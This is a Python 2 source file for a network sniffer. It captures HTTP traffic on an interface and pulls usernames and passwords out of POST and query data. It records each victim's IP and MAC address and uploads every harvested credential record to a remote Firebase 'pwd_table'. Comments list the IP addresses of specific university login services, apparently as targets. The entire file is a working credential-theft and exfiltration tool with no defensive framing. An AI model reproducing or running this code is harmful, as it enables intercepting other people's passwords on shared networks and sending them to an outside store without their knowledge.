import dpkt
import pcap
import re
import socket
import urlparse
import binascii
from firebase import firebase
from pprint import pprint
import settings
from utils import add_colons_to_mac

APP_TO_PORT = {80: 'http', 23: 'telnet'}


class Sniffer(object):
    def __init__(self, *args, **kwargs):

        self._firebase = firebase.FirebaseApplication(settings.FIREBASE_URL,
                                                      None)
        # TODO:
        # Need to check firebase data first
        # if status is "ON" exit the sniffer

        # Status update
        self._firebase.patch('/status', {"status": "ON"})

        pattern = 'tcp and dst port 80'
        # pattern = 'tcp and dst port 80 and dst port 23'
        self.pc = pcap.pcap(kwargs['interface'])
        self.pc.setfilter(pattern)

        self.all_user_info = {}
        self.info_counter = 0

    def _is_host(self, content):
        regex = re.compile('Host: (.*)')
        return content is not None and regex.search(content)

    def _is_pwd(self, content):
        regex = re.compile('(.*)[password]=(.*)')
        return content is not None and regex.search(content)

    def _is_pwd_with_txt(self, content):
        regex = re.compile('(.*)[txtPwd]=(.*)')
        return content is not None and regex.search(content)

    def _pick_info(self, data, client, server, app, eth_src):
        self.info_counter += 1
        self.all_user_info[self.info_counter] = (
            {'client': client, 'server': server,
             'app': APP_TO_PORT.get(app),
             'mac': add_colons_to_mac(binascii.hexlify(eth_src))}
        )

        if data.get('account'):
            self.all_user_info[self.info_counter].update(
                {'login': data.get('account')[0]})
        elif data.get('username'):
            self.all_user_info[self.info_counter].update(
                {'login': data.get('username')[0]})
        elif data.get('identification'):
            self.all_user_info[self.info_counter].update({
                'login': data.get('identification')[0]})
        elif data.get('id'):
            self.all_user_info[self.info_counter].update(
                {'login': data.get('id')[0]})
        elif data.get('os_username'):
            self.all_user_info[self.info_counter].update(
                {'login': data.get('os_username')[0]})
        elif data.get('txtAccount'):
            self.all_user_info[self.info_counter].update(
                {'login': data.get('txtAccount')[0]})
        else:
            self.all_user_info[self.info_counter].update({'login': None})

        if data.get('password'):
            self.all_user_info[self.info_counter].update(
                {'password': data.get('password')[0]})
        elif data.get('os_password'):
            self.all_user_info[self.info_counter].update(
                {'password': data.get('os_password')[0]})
        elif data.get('txtPwd'):
            self.all_user_info[self.info_counter].update(
                {'password': data.get('txtPwd')[0]})
        else:
            self.all_user_info[self.info_counter].update({'password': None})

        print "New Password get:"
        pprint(self.all_user_info[self.info_counter])
        self._firebase.post('/pwd_table', self.all_user_info[self.info_counter])

    def _get_http_payload(self, eth_pkt, ip_pkt, tcp_pkt):
        try:
            http_req = dpkt.http.Request(tcp_pkt.data)
            if http_req.method == 'POST':
                # This is POST method
                pass
        except dpkt.dpkt.UnpackError:
            pass

        if 'POST' in tcp_pkt.data:
            # print 'POST', tcp.data
            if 'password=' in tcp_pkt.data:
                # print 'In POST packet password', tcp.data
                pwd_obj = self._is_pwd(tcp_pkt.data)
                if pwd_obj:
                    # print 'query string found:', pwd_obj.group(0)
                    qs_d = urlparse.parse_qs(pwd_obj.group(0))
                    # print qs_d
                    self._pick_info(qs_d, socket.inet_ntoa(ip_pkt.src),
                                    socket.inet_ntoa(ip_pkt.dst),
                                    tcp_pkt.dport, eth_pkt.src)

        elif 'password=' in tcp_pkt.data:
            # print 'password', tcp.data
            qs_d = urlparse.parse_qs(tcp_pkt.data)
            # print qs_d
            self._pick_info(qs_d, socket.inet_ntoa(ip_pkt.src),
                            socket.inet_ntoa(ip_pkt.dst),
                            tcp_pkt.dport, eth_pkt.src)

        elif 'txtPwd=' in tcp_pkt.data:
            qs_d = urlparse.parse_qs(tcp_pkt.data)
            self._pick_info(qs_d, socket.inet_ntoa(ip_pkt.src),
                            socket.inet_ntoa(ip_pkt.dst),
                            tcp_pkt.dport, eth_pkt.src)
        else:
            return
        # Moocs dst IP 140.114.60.144
        # Kits dst IP 74.125.204.121
        # iLMS dst IP 140.114.69.137

    def loop(self):
        while True:
            try:
                for ts, buf in self.pc:
                    eth = dpkt.ethernet.Ethernet(buf)
                    ip = eth.data
                    tcp = ip.data
                    if len(tcp.data) > 0:
                        self._get_http_payload(eth, ip, tcp)

            except KeyboardInterrupt:
                nrecv, ndrop, nifdrop = self.pc.stats()
                print '\n%d packets received by filter' % nrecv
                print '%d packets dropped by kernel' % ndrop
                # print 'All user info: '
                # pprint(self.all_user_info)
                break
            except (NameError, TypeError):
                # print "No packet"
                continue

    def __del__(self):
        # Status update
        self._firebase.patch('/status', {"status": "OFF"})


if __name__ == "__main__":
    s = Sniffer(interface='eth2')
    print '%s is listening on' % s.pc.name
    s.loop()
